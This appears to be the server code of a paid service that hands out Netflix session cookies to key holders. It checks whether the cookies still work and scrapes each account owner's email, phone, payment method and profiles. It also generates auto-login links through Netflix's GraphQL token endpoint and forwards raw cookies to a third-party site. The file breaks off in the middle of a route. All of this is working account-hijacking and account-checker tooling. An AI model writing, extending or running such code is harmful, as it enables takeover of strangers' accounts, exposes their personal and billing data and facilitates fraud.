import express, { type Request, Response, NextFunction } from "express";
import { createServer } from "http";
import { z } from "zod";

const app = express();
// Keep the signature consistent with the old implementation.
// (We don't call listen() on Vercel.)
createServer(app);

// Vercel sits behind a proxy (needed for req.ip / x-forwarded-for)
app.set("trust proxy", 1);

declare module "http" {
  interface IncomingMessage {
    rawBody: unknown;
  }
}

app.use(
  express.json({
    verify: (req, _res, buf) => {
      req.rawBody = buf;
    },
  }),
);

app.use(express.urlencoded({ extended: false }));

// Security headers
app.use((_req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("X-XSS-Protection", "1; mode=block");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
  res.setHeader("X-Powered-By", "");
  res.removeHeader("X-Powered-By");
  if (process.env.NODE_ENV === "production") {
    res.setHeader(
      "Content-Security-Policy",
      "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; font-src 'self'; frame-ancestors 'none';",
    );
  }
  next();
});

function log(message: string, source = "api") {
  const formattedTime = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  });

  console.log(`${formattedTime} [${source}] ${message}`);
}

// Request logging
app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      log(logLine);
    }
  });

  next();
});

// --------------------
// Supabase helpers
// --------------------

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;

function assertSupabaseEnv() {
  if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
    // Throwing here makes the error visible in Vercel logs, but we also
    // return a helpful message for /api/health.
    throw new Error("SUPABASE_URL and SUPABASE_ANON_KEY environment variables are required");
  }
}

async function supabaseRequest(path: string, options: RequestInit = {}) {
  assertSupabaseEnv();
  const url = `${SUPABASE_URL}/rest/v1/${path}`;
  return fetch(url, {
    ...options,
    headers: {
      apikey: SUPABASE_ANON_KEY!,
      Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
      "Content-Type": "application/json",
      Prefer: "return=representation",
      ...options.headers,
    },
  });
}

// --------------------
// Schemas
// --------------------

const loginRequestSchema = z.object({
  key: z.string().min(1, "Activation key is required"),
  deviceId: z.string().min(1, "Device ID is required"),
});

const cookieSessionSchema = z.object({
  id: z.number(),
  cookies: z.any().nullable(),
  description: z.string().nullable(),
  is_premium: z.boolean().default(false),
  status: z.string().nullable().optional(),
  premium: z.string().nullable().optional(),
  country: z.string().nullable().optional(),
  plan: z.string().nullable().optional(),
  price: z.string().nullable().optional(),
  memberSince: z.string().nullable().optional(),
  member_since: z.string().nullable().optional(),
  paymentMethod: z.string().nullable().optional(),
  payment_method: z.string().nullable().optional(),
  phone: z.string().nullable().optional(),
  phoneVerified: z.string().nullable().optional(),
  phone_verified: z.string().nullable().optional(),
  videoQuality: z.string().nullable().optional(),
  video_quality: z.string().nullable().optional(),
  maxStreams: z.string().nullable().optional(),
  max_streams: z.string().nullable().optional(),
  paymentHold: z.string().nullable().optional(),
  payment_hold: z.string().nullable().optional(),
  extraMember: z.string().nullable().optional(),
  extra_member: z.string().nullable().optional(),
  email: z.string().nullable().optional(),
  emailVerified: z.string().nullable().optional(),
  email_verified: z.string().nullable().optional(),
  profiles: z.string().nullable().optional(),
  billing: z.string().nullable().optional(),
  rawData: z.string().nullable().optional(),
  raw_data: z.string().nullable().optional(),
}).passthrough();

const checkRequestSchema = z.object({
  cookies: z.any().optional(),
  sessionId: z.number({ required_error: "sessionId is required" }),
});

const watchRequestSchema = z.object({
  sessionId: z.number({ required_error: "sessionId is required" }),
  target: z.enum(["direct", "app", "tv"]).default("direct"),
});

type WatchTarget = z.infer<typeof watchRequestSchema>["target"];

// --------------------
// Auth / rate-limit
// --------------------

const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_MINUTES = 15;
const loginAttempts = new Map<string, { count: number; lockedUntil: number }>();

function getClientIp(req: Request): string {
  return (
    (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
    req.ip ||
    "unknown"
  );
}

function checkRateLimit(ip: string): { allowed: boolean; retryAfter?: number } {
  const record = loginAttempts.get(ip);
  if (!record) return { allowed: true };

  if (record.lockedUntil > Date.now()) {
    const retryAfter = Math.ceil((record.lockedUntil - Date.now()) / 1000);
    return { allowed: false, retryAfter };
  }

  if (record.lockedUntil <= Date.now() && record.count >= MAX_LOGIN_ATTEMPTS) {
    loginAttempts.delete(ip);
    return { allowed: true };
  }

  return { allowed: true };
}

function recordFailedAttempt(ip: string) {
  const record = loginAttempts.get(ip) || { count: 0, lockedUntil: 0 };
  record.count += 1;
  if (record.count >= MAX_LOGIN_ATTEMPTS) {
    record.lockedUntil = Date.now() + LOCKOUT_MINUTES * 60 * 1000;
    log(
      `Rate limit: IP ${ip} locked out for ${LOCKOUT_MINUTES} minutes after ${record.count} failed attempts`,
    );
  }
  loginAttempts.set(ip, record);
}

function recordSuccessfulLogin(ip: string) {
  loginAttempts.delete(ip);
}

async function verifyAuth(req: Request, res: Response, next: NextFunction) {
  const authKey = req.headers["x-activation-key"] as string;
  const deviceId = req.headers["x-device-id"] as string;

  if (!authKey || !deviceId) {
    return res.status(401).json({ message: "Unauthorized" });
  }

  try {
    let response = await supabaseRequest(
      `activation_keys?key=eq.${encodeURIComponent(authKey)}&select=key,is_active,expires_at,devices,device_limit,max_devices,is_premium`,
    );

    if (!response.ok) {
      // Backward-compatible fallback if DB schema doesn't have is_premium.
      const errText = await response.text();
      if (errText.includes("is_premium") && errText.includes("does not exist")) {
        response = await supabaseRequest(
          `activation_keys?key=eq.${encodeURIComponent(authKey)}&select=key,is_active,expires_at,devices,device_limit,max_devices`,
        );
        if (!response.ok) return res.status(401).json({ message: "Unauthorized" });
      } else {
        return res.status(401).json({ message: "Unauthorized" });
      }
    }

    const rows = await response.json();
    if (!rows.length) {
      return res.status(401).json({ message: "Unauthorized" });
    }

    const record = rows[0];
    if (!record.is_active) {
      return res.status(401).json({ message: "Key deactivated" });
    }
    if (record.expires_at && new Date(record.expires_at) < new Date()) {
      return res.status(401).json({ message: "Key expired" });
    }

    const devices: string[] = Array.isArray(record.devices) ? record.devices : [];
    if (!devices.includes(deviceId)) {
      if (record.device_limit === "single" && devices.length >= 1) {
        return res.status(403).json({ message: "Device limit reached" });
      }
      if (record.device_limit === "limited" && devices.length >= record.max_devices) {
        return res.status(403).json({ message: "Device limit reached" });
      }
    }

    (req as any).userIsPremium = record.is_premium === true;
    next();
  } catch (err: any) {
    log(`verifyAuth error: ${err?.message || String(err)}`);
    return res.status(401).json({ message: "Unauthorized" });
  }
}

// --------------------
// Netflix cookie validator (HTTP)
// --------------------

interface CookieObj {
  name: string;
  value: string;
  domain?: string;
  [key: string]: any;
}

const UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
const GRAPHQL_UA =
  "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)";
const GRAPHQL_URL = "https://android13.prod.ftl.netflix.com/graphql";
const GRAPHQL_REQUIRED_COOKIES = ["securenetflixid", "gsid"];

type FetchResponse = Awaited<ReturnType<typeof fetch>>;

function cookiesToHeader(cookies: CookieObj[] | string): string {
  if (typeof cookies === "string") {
    try {
      const parsed = JSON.parse(cookies);
      if (Array.isArray(parsed)) {
        return parsed
          .filter((c: any) => c.name && c.value)
          .map((c: any) => `${c.name}=${c.value}`)
          .join("; ");
      }
    } catch {}
    return cookies;
  }
  if (Array.isArray(cookies)) {
    return cookies
      .filter((c) => c.name && c.value)
      .map((c) => `${c.name}=${c.value}`)
      .join("; ");
  }
  return String(cookies);
}

function isMinimalCookieSet(cookies: CookieObj[] | string): boolean {
  if (Array.isArray(cookies)) {
    return cookies.length <= 2;
  }
  if (typeof cookies === "string") {
    try {
      const parsed: unknown = JSON.parse(cookies);
      if (Array.isArray(parsed)) {
        return parsed.length <= 2;
      }
    } catch {}
    return (cookies.match(/;/g) || []).length <= 1;
  }
  return false;
}

function hasMissingGraphQLCookies(cookieHeader: string): boolean {
  const lower = cookieHeader.toLowerCase();
  return GRAPHQL_REQUIRED_COOKIES.some((name) => !lower.includes(`${name}=`));
}

function parseSetCookiesIntoMap(res: FetchResponse, cookieMap: Record<string, string>): void {
  const headers = res.headers as Headers & { getSetCookie?: () => string[] };
  let setCookies: string[] = [];
  if (typeof headers.getSetCookie === "function") {
    setCookies = headers.getSetCookie();
  } else {
    const raw = res.headers.get("set-cookie");
    if (raw) {
      setCookies = [raw];
    }
  }

  for (const sc of setCookies) {
    const cookiePart = sc.split(";")[0].trim();
    const eqIdx = cookiePart.indexOf("=");
    if (eqIdx > 0) {
      const name = cookiePart.substring(0, eqIdx).trim();
      const value = cookiePart.substring(eqIdx + 1);
      const lower = sc.toLowerCase();
      if (name && !lower.includes("max-age=0") && !lower.includes("expires=thu, 01 jan 1970")) {
        cookieMap[name] = value;
      }
    }
  }
}

async function followHop(
  url: string,
  cookieMap: Record<string, string>,
  extraHeaders: Record<string, string> = {},
): Promise<{ status: number; location: string | null }> {
  const cookieStr = Object.entries(cookieMap).map(([k, v]) => `${k}=${v}`).join("; ");
  const res = await fetch(url, {
    method: "GET",
    headers: {
      "User-Agent": UA,
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      Cookie: cookieStr,
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none",
      "Cache-Control": "no-cache",
      ...extraHeaders,
    },
    redirect: "manual",
    signal: AbortSignal.timeout(15000),
  });
  parseSetCookiesIntoMap(res, cookieMap);
  return { status: res.status, location: res.headers.get("location") };
}

async function enrichCookiesViaHTTP(cookieHeader: string): Promise<string> {
  try {
    const cookieMap: Record<string, string> = {};
    cookieHeader.split(";").forEach((part) => {
      const trimmed = part.trim();
      const eqIdx = trimmed.indexOf("=");
      if (eqIdx > 0) {
        const name = trimmed.substring(0, eqIdx).trim();
        const value = trimmed.substring(eqIdx + 1);
        if (name) {
          cookieMap[name] = value;
        }
      }
    });

    for (let currentUrl = "https://www.netflix.com/", hop = 0; hop < 6; hop++) {
      const { status, location } = await followHop(currentUrl, cookieMap);
      if (status >= 300 && status < 400 && location) {
        currentUrl = location.startsWith("http") ? location : `https://www.netflix.com${location}`;
        continue;
      }
      break;
    }

    for (let accountUrl = "https://www.netflix.com/YourAccount", hop = 0; hop < 4; hop++) {
      const { status, location } = await followHop(accountUrl, cookieMap);
      if (status >= 300 && status < 400 && location) {
        accountUrl = location.startsWith("http") ? location : `https://www.netflix.com${location}`;
        continue;
      }
      break;
    }

    for (let browseUrl = "https://www.netflix.com/browse", hop = 0; hop < 4; hop++) {
      const { status, location } = await followHop(browseUrl, cookieMap);
      if (status >= 300 && status < 400 && location) {
        browseUrl = location.startsWith("http") ? location : `https://www.netflix.com${location}`;
        continue;
      }
      break;
    }

    for (let loginUrl = "https://www.netflix.com/login", hop = 0; hop < 3; hop++) {
      const { status, location } = await followHop(loginUrl, cookieMap);
      if (status >= 300 && status < 400 && location) {
        loginUrl = location.startsWith("http") ? location : `https://www.netflix.com${location}`;
        continue;
      }
      break;
    }

    return Object.entries(cookieMap).map(([k, v]) => `${k}=${v}`).join("; ");
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    log(`Cookie enrichment failed: ${message}`);
    return cookieHeader;
  }
}

function decodeHexEscapes(str: string): string {
  let decoded = str;
  decoded = decoded.replace(/\\x([0-9a-fA-F]{2})/g, (_, code) =>
    String.fromCharCode(parseInt(code, 16)),
  );
  decoded = decoded.replace(/\\u([0-9a-fA-F]{4})/g, (_, code) =>
    String.fromCharCode(parseInt(code, 16)),
  );
  decoded = decoded.replace(/&#x([0-9a-fA-F]+);/g, (_, code) =>
    String.fromCharCode(parseInt(code, 16)),
  );
  decoded = decoded.replace(/&#(\d+);/g, (_, code) =>
    String.fromCharCode(parseInt(code, 10)),
  );
  const entities: Record<string, string> = {
    "&amp;": "&",
    "&lt;": "<",
    "&gt;": ">",
    "&quot;": '"',
    "&apos;": "'",
    "&atilde;": "ã",
    "&ntilde;": "ñ",
    "&eacute;": "é",
    "&iacute;": "í",
    "&oacute;": "ó",
    "&uacute;": "ú",
    "&ccedil;": "ç",
    "&Atilde;": "Ã",
    "&Ntilde;": "Ñ",
    "&Eacute;": "É",
    "&Iacute;": "Í",
    "&Oacute;": "Ó",
    "&Uacute;": "Ú",
    "&Ccedil;": "Ç",
    "&uuml;": "ü",
    "&ouml;": "ö",
    "&auml;": "ä",
    "&szlig;": "ß",
    "&agrave;": "à",
    "&egrave;": "è",
    "&nbsp;": " ",
  };
  for (const [entity, char] of Object.entries(entities)) {
    decoded = decoded.split(entity).join(char);
  }
  return decoded;
}

function extractNetflixCookies(setCookieHeaders: string[]): {
  netflixId: string | null;
  secureNetflixId: string | null;
} {
  let netflixId: string | null = null;
  let secureNetflixId: string | null = null;
  for (const sc of setCookieHeaders) {
    if (sc.startsWith("NetflixId=")) {
      netflixId = sc.match(/NetflixId=([^;]+)/)?.[1] || null;
    }
    if (sc.startsWith("SecureNetflixId=")) {
      secureNetflixId = sc.match(/SecureNetflixId=([^;]+)/)?.[1] || null;
    }
  }
  return { netflixId, secureNetflixId };
}

async function fetchWatchLinkFromMakizig(
  cookieHeader: string,
  netflixId?: string | null,
  secureNetflixId?: string | null,
): Promise<string | null> {
  const cookieToSend = netflixId && secureNetflixId ? `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}` : cookieHeader;

  try {
    const formData = new URLSearchParams();
    formData.append("raw_cookie", cookieToSend);

    const r = await fetch("https://makizig.com/unli-netflix/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": UA,
        Accept: "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://makizig.com",
        Referer: "https://makizig.com/unli-netflix/",
      },
      body: formData.toString(),
      signal: AbortSignal.timeout(30000),
    });

    const html = await r.text();
    const linkMatch = html.match(/<textarea id="hiddenLink"[^>]*>([\s\S]*?)<\/textarea>/);
    if (linkMatch) {
      const link = linkMatch[1].trim();
      if (link.includes("nftoken=")) {
        return link;
      }
    }
    return null;
  } catch (err: any) {
    log(`Makizig watch link fetch failed: ${err.message}`);
    return null;
  }
}

function getNetflixActionLink(watchLink: string, target: WatchTarget): string {
  const targetPath = target === "app" ? "unsupported" : target === "tv" ? "tv8" : "browse";
  const match = watchLink.match(/nftoken=([^&\s]+)/);
  if (match) {
    const token = match[1];
    return `https://netflix.com/?nftoken=${token}&nextPage=${encodeURIComponent(`/${targetPath}`)}`;
  }
  return watchLink.replace(/^(https:\/\/netflix\.com\/)[^?]*/, `$1${targetPath}`);
}

async function fetchWatchLinkFromGraphQL(cookieHeader: string): Promise<string | null> {
  const payload = {
    operationName: "CreateAutoLoginToken",
    variables: { scope: "WEBVIEW_MOBILE_STREAMING" },
    extensions: {
      persistedQuery: {
        version: 102,
        id: "76e97129-f4b5-41a0-a73c-12e674896849",
      },
    },
  };

  try {
    const r = await fetch(GRAPHQL_URL, {
      method: "POST",
      headers: {
        "User-Agent": GRAPHQL_UA,
        Accept: "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
        "Content-Type": "application/json",
        Origin: "https://www.netflix.com",
        Referer: "https://www.netflix.com/",
        Cookie: cookieHeader,
      },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(30000),
    });

    if (!r.ok) {
      log(`GraphQL token fetch HTTP error: ${r.status}`);
      return null;
    }

    const data = await r.json();
    const token = data?.data?.createAutoLoginToken;
    if (token) {
      return `https://netflix.com/YourAccount?nftoken=${token}`;
    }

    if (data?.errors) {
      log(`GraphQL token fetch API error: ${JSON.stringify(data.errors)}`);
    }
    return null;
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    log(`GraphQL watch link fetch failed: ${message}`);
    return null;
  }
}

async function generateNetflixWatchLink(cookies: CookieObj[] | string, target: WatchTarget): Promise<string | null> {
  let cookieHeader = cookiesToHeader(cookies);
  if (!cookieHeader || cookieHeader.length < 10) {
    return null;
  }

  const needsEnrichment = isMinimalCookieSet(cookies) || hasMissingGraphQLCookies(cookieHeader);
  if (needsEnrichment) {
    cookieHeader = await enrichCookiesViaHTTP(cookieHeader);
  }

  let watchLink = await fetchWatchLinkFromGraphQL(cookieHeader);
  if (!watchLink && !needsEnrichment) {
    const enrichedForToken = await enrichCookiesViaHTTP(cookieHeader);
    if (enrichedForToken !== cookieHeader) {
      watchLink = await fetchWatchLinkFromGraphQL(enrichedForToken);
    }
  }

  return watchLink ? getNetflixActionLink(watchLink, target) : null;
}

function regexExtract(html: string, pattern: RegExp): string | null {
  const match = html.match(pattern);
  return match?.[1]?.trim() || null;
}

async function fetchWithRedirect(
  url: string,
  cookieHeader: string,
): Promise<{ html: string; finalUrl: string }> {
  let currentUrl = url;
  let maxRedirects = 5;

  while (maxRedirects > 0) {
    const res = await fetch(currentUrl, {
      method: "GET",
      headers: {
        "User-Agent": UA,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        Cookie: cookieHeader,
      },
      redirect: "manual",
    });

    if (res.status >= 300 && res.status < 400) {
      const location = res.headers.get("location");
      if (!location) break;
      currentUrl = location.startsWith("http") ? location : `https://www.netflix.com${location}`;
      maxRedirects--;
      continue;
    }

    const html = await res.text();
    return { html, finalUrl: currentUrl };
  }

  return { html: "", finalUrl: currentUrl };
}

async function validateNetflixCookies(cookies: any): Promise<any> {
  let cookieHeader = cookiesToHeader(cookies);
  if (!cookieHeader || cookieHeader.length < 10) {
    return { valid: false, error: "Invalid cookie data" };
  }

  const needsEnrichment = isMinimalCookieSet(cookies) || hasMissingGraphQLCookies(cookieHeader);
  if (needsEnrichment) {
    cookieHeader = await enrichCookiesViaHTTP(cookieHeader);
  }

  try {
    const { html: accountHtml, finalUrl: accountUrl } = await fetchWithRedirect(
      "https://www.netflix.com/YourAccount",
      cookieHeader,
    );

    if (accountUrl.includes("/login") || accountUrl.includes("/Login")) {
      return { valid: false, error: "Cookie is dead / expired" };
    }

    const hasReactContext = accountHtml.includes("netflix.reactContext");
    const hasAuthURL = /"authURL"\s*:/.test(accountHtml);
    const hasMemberStatus = /"membershipStatus"/.test(accountHtml);

    if (!hasReactContext && !hasAuthURL && !hasMemberStatus) {
      return { valid: false, error: "Cookie is dead / expired" };
    }

    let reactData: any = null;
    const reactMatch = accountHtml.match(
      /netflix\.reactContext\s*=\s*(\{[\s\S]*?\});\s*<\/script>/,
    );
    if (reactMatch) {
      try {
        let jsonStr = reactMatch[1];
        jsonStr = jsonStr.replace(/\\x([0-9a-fA-F]{2})/g, (_, c) => {
          const charCode = parseInt(c, 16);
          if (charCode === 0x22) return '\\"';
          if (charCode === 0x5c) return "\\\\";
          return String.fromCharCode(charCode);
        });
        reactData = JSON.parse(jsonStr);
      } catch (e: any) {
        log(`reactContext parse error: ${e.message}`);
      }
    }

    const userInfo = reactData?.models?.userInfo?.data || {};
    const signupData = reactData?.models?.signupContext?.data?.flow?.fields || {};
    const currentPlan = signupData?.currentPlan?.fields || {};

    const plan =
      currentPlan?.localizedPlanName?.value ||
      regexExtract(accountHtml, /"planName"\s*:\s*"([^"]+)"/) ||
      regexExtract(accountHtml, /"localizedPlanName"[^}]*"value"\s*:\s*"([^"]+)"/);

    const price =
      currentPlan?.planPrice?.value ||
      regexExtract(accountHtml, /"planPrice"[^}]*"value"\s*:\s*"([^"]+)"/);

    const email =
      userInfo.emailAddress ||
      regexExtract(accountHtml, /"memberEmail"\s*:\s*"([^"]+)"/) ||
      regexExtract(accountHtml, /"emailAddress"\s*:\s*"([^"]+)"/);

    const country =
      userInfo.countryOfSignup ||
      userInfo.currentCountry ||
      regexExtract(accountHtml, /"countryOfSignup"\s*:\s*"([^"]+)"/);

    const memberSince = userInfo.memberSince || regexExtract(accountHtml, /"memberSince"\s*:\s*"([^"]+)"/);

    const maxStreamsVal =
      currentPlan?.maxStreams?.value ||
      regexExtract(accountHtml, /"maxStreams"[^}]*"value"\s*:\s*(\d+)/);
    const maxStreams = maxStreamsVal ? String(maxStreamsVal) : undefined;

    const videoQuality =
      currentPlan?.videoQuality?.value ||
      regexExtract(accountHtml, /"videoQuality"[^}]*"value"\s*:\s*"([^"]+)"/);

    let paymentMethod: string | undefined;
    const paymentMethods = signupData?.paymentMethods?.value;
    if (Array.isArray(paymentMethods) && paymentMethods.length > 0) {
      const pm = paymentMethods[0]?.value;
      paymentMethod = pm?.paymentMethod?.value || pm?.type?.value;
    }
    if (!paymentMethod) {
      paymentMethod =
        regexExtract(accountHtml, /"paymentMethodType"\s*:\s*"([^"]+)"/) ||
        regexExtract(accountHtml, /"paymentMethod"[^}]*"value"\s*:\s*"([^"]+)"/) ||
        undefined;
    }

    let phone: string | undefined;
    const phoneVal = regexExtract(accountHtml, /"phoneNumber"\s*:\s*"([^"]+)"/);
    if (phoneVal) phone = decodeHexEscapes(phoneVal);

    const phoneVerified = regexExtract(accountHtml, /"phoneVerified"\s*:\s*(true|false)/);

    let emailVerified: string | undefined;
    const graphqlData = reactData?.models?.graphql?.data || {};
    for (const key of Object.keys(graphqlData)) {
      if (key.includes("Profile:")) {
        const profile = graphqlData[key];
        if (profile?.growthEmail?.isVerified !== undefined) {
          emailVerified = profile.growthEmail.isVerified ? "Yes" : "No";
          break;
        }
      }
    }
    if (!emailVerified) {
      const ev = regexExtract(accountHtml, /"emailVerified"\s*:\s*(true|false)/);
      emailVerified = ev === "true" ? "Yes" : ev === "false" ? "No" : undefined;
    }

    let profiles: string | undefined;
    const profileNames: string[] = [];

    const { html: browseHtml } = await fetchWithRedirect("https://www.netflix.com/browse", cookieHeader);

    const browseIsLogin = browseHtml.includes("/login") && !browseHtml.includes('"profileName"');
    const browseProfiles = browseIsLogin ? null : browseHtml.match(/"profileName"\s*:\s*"([^"]+)"/g);
    if (browseProfiles) {
      for (const p of browseProfiles) {
        const nm = p.match(/"profileName"\s*:\s*"([^"]+)"/);
        if (nm) profileNames.push(decodeHexEscapes(nm[1]));
      }
    }

    if (profileNames.length === 0) {
      const allProfiles = accountHtml.match(/"profileName"\s*:\s*"([^"]+)"/g);
      if (allProfiles) {
        for (const p of allProfiles) {
          const nm = p.match(/"profileName"\s*:\s*"([^"]+)"/);
          if (nm) profileNames.push(decodeHexEscapes(nm[1]));
        }
      }
    }

    const uniqueProfiles = Array.from(new Set(profileNames));
    if (uniqueProfiles.length > 0) {
      profiles = decodeHexEscapes(uniqueProfiles.join(", "));
    }

    const memberStatus = userInfo.membershipStatus || regexExtract(accountHtml, /"membershipStatus"\s*:\s*"([^"]+)"/);
    const isCancelled =
      memberStatus === "CANCELLED" ||
      memberStatus === "CANCELED" ||
      accountHtml.includes('"isCanceled":true');
    const status = isCancelled ? "Cancelled" : "Valid";

    let isExtraMember: string | undefined;
    const extraMemberVal = regexExtract(accountHtml, /"isExtraMember"\s*:\s*(true|false)/);
    if (extraMemberVal) {
      isExtraMember = extraMemberVal === "true" ? "Yes" : "No";
    }
    if (!isExtraMember) {
      const emField = signupData?.isExtraMember;
      if (emField !== undefined) {
        isExtraMember = emField?.value ? "Yes" : "No";
      }
    }

    const paymentHold = regexExtract(accountHtml, /"isPaymentHold"\s*:\s*(true|false)/);

    let nextBillingDate: string | undefined;
    const nbdField = signupData?.nextBillingDate;
    if (nbdField?.value) {
      nextBillingDate = String(nbdField.value);
    }
    if (!nextBillingDate) {
      nextBillingDate =
        regexExtract(accountHtml, /"nextBillingDate"[^}]*"value"\s*:\s*"([^"]+)"/) ||
        regexExtract(accountHtml, /"nextBillingDate"\s*:\s*"([^"]+)"/) ||
        undefined;
    }
    if (!nextBillingDate) {
      const nbdNum = regexExtract(accountHtml, /"nextBillingDate"[^}]*"value"\s*:\s*(\d{10,})/);
      if (nbdNum) {
        nextBillingDate = new Date(parseInt(nbdNum)).toISOString();
      }
    }

    const premium =
      plan?.toLowerCase().includes("premium")
        ? "Yes"
        : plan?.toLowerCase().includes("standard")
          ? "Yes"
          : plan?.toLowerCase().includes("basic")
            ? "No"
            : plan
              ? "Yes"
              : undefined;

    let watchLink = await fetchWatchLinkFromGraphQL(cookieHeader);
    if (!watchLink && !needsEnrichment) {
      const enrichedForToken = await enrichCookiesViaHTTP(cookieHeader);
      if (enrichedForToken !== cookieHeader) {
        watchLink = await fetchWatchLinkFromGraphQL(enrichedForToken);
      }
    }
    if (watchLink) {
      watchLink = getNetflixActionLink(watchLink, "direct");
    }

    const rawParts: string[] = [];
    if (plan) rawParts.push(`Plan: ${plan}`);
    if (country) rawParts.push(`Country: ${country}`);
    if (price) rawParts.push(`Price: ${price}`);
    if (email) rawParts.push(`\nEmail: ${email}`);
    if (profiles) rawParts.push(`\nProfiles: ${profiles}`);
    const rawData = rawParts.join(" | ");

    return {
      valid: true,
      status,
      premium,
      country: country?.toUpperCase(),
      plan: plan ? decodeHexEscapes(plan) : undefined,
      price: price ? decodeHexEscapes(price) : undefined,
      memberSince: memberSince ? decodeHexEscapes(memberSince) : undefined,
      paymentMethod,
      phone,
      phoneVerified:
        phoneVerified === "true" ? "Yes" : phoneVerified === "false" ? "No" : undefined,
      videoQuality,
      maxStreams,
      paymentHold:
        paymentHold === "true" ? "Yes" : paymentHold === "false" ? "No" : undefined,
      extraMember: isExtraMember,
      email,
      emailVerified,
      profiles,
      billing: nextBillingDate ? decodeHexEscapes(nextBillingDate) : undefined,
      watchLink: watchLink || undefined,
      rawData: rawData || undefined,
    };
  } catch (err: any) {
    log(`Netflix validation error: ${err.message}`);
    return { valid: false, error: "Failed to validate cookie" };
  }
}

// --------------------
// Routes
// --------------------

app.get("/api/health", (_req, res) => {
  try {
    assertSupabaseEnv();
    res.json({ ok: true });
  } catch (e: any) {
    res.status(500).json({ ok: false, error: e?.message || String(e) });
  }
});

app.post("/api/auth/login", async (req: Request, res: Response) => {
  try {
    const ip = getClientIp(req);
    const rateCheck = checkRateLimit(ip);
    if (!rateCheck.allowed) {
      return res.status(429).json({
        success: false,
        error: `Too many attempts. Try again in ${rateCheck.retryAfter} seconds.`,
      });
    }

    const parsed = loginRequestSchema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ success: false, error: "Invalid request" });
    }

    const { key, deviceId } = parsed.data;

    const response = await supabaseRequest(`activation_keys?key=eq.${encodeURIComponent(key)}&select=*`);
    if (!response.ok) {
      log(`Supabase auth error: ${await response.text()}`);
      return res.status(500).json({ success: false, error: "Server error" });
    }

    const rows = await response.json();
    if (!rows.length) {
      recordFailedAttempt(ip);
      await new Promise((r) => setTimeout(r, 500 + Math.random() * 500));
      return res.status(401).json({ success: false, error: "Invalid activation key" });
    }

    const record = rows[0];

    if (!record.is_active) {
      recordFailedAttempt(ip);
      return res.status(401).json({ success: false, error: "This key has been deactivated" });
    }

    if (record.expires_at && new Date(record.expires_at) < new Date()) {
      recordFailedAttempt(ip);
      return res.status(401).json({ success: false, error: "This key has expired" });
    }

    const devices: string[] = Array.isArray(record.devices) ? record.devices : [];

    if (!devices.includes(deviceId)) {
      if (record.device_limit === "single" && devices.length >= 1) {
        recordFailedAttempt(ip);
        return res.status(403).json({
          success: false,
          error: "Device limit reached. This key is locked to another device.",
        });
      }
      if (record.device_limit === "limited" && devices.length >= record.max_devices) {
        recordFailedAttempt(ip);
        return res.status(403).json({
          success: false,
          error: `Device limit reached (${record.max_devices} devices max).`,
        });
      }

      const updatedDevices = [...devices, deviceId];
      const updateRes = await supabaseRequest(`activation_keys?id=eq.${record.id}`, {
        method: "PATCH",
        body: JSON.stringify({ devices: updatedDevices }),
      });

      if (!updateRes.ok) {
        log(`Failed to update devices: ${await updateRes.text()}`);
      }
    }

    recordSuccessfulLogin(ip);
    const expiresAt = record.expires_at ? new Date(record.expires_at).toISOString() : null;

    return res.json({
      success: true,
      deviceLimit: record.device_limit,
      maxDevices: record.max_devices,
      currentDevices: devices.includes(deviceId) ? devices.length : devices.length + 1,
      expiresAt,
      isPremium: record.is_premium === true,
    });
  } catch (err: any) {
    log(`Auth error: ${err.message}`);
    return res.status(500).json({ success: false, error: "Authentication failed" });
  }
});

app.get("/api/cookies", verifyAuth, async (req: Request, res: Response) => {
  try {
    const userIsPremium = (req as any).userIsPremium === true;

    const response = await supabaseRequest("cookie_sessions?select=*&order=id.asc");

    if (!response.ok) {
      log(`Supabase error: ${await response.text()}`);
      return res.status(500).json({ message: "Failed to fetch cookies from database" });
    }

    const rawData = await response.json();
    const data = (rawData as Array<{ is_premium?: boolean }>).map((row) => ({ ...row, is_premium: row.is_premium === true }));

    const validated = z.array(cookieSessionSchema).safeParse(data);
    if (!validated.success) {
      log(`Supabase response validation failed: ${validated.error.message}`);
